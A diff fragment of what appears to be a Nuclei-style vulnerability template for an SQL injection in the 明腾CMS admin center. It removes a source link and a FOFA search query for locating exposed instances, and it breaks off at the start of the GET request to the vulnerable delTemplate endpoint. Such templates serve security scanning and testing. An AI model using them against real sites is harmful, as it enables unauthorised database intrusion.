@@ -3,12 +3,8 @@ info:
   name: 明腾CMS后台管理中心系统 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xqmiap5btn4y1n61'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xqmiap5btn4y1n61
-    fofa: Fofa：title="明腾CMS管理中心"
 http:
 - raw:
   - 'GET /index.php?m=mingteng&c=Smstemplate&a=delTemplate&id=x HTTP/1.1
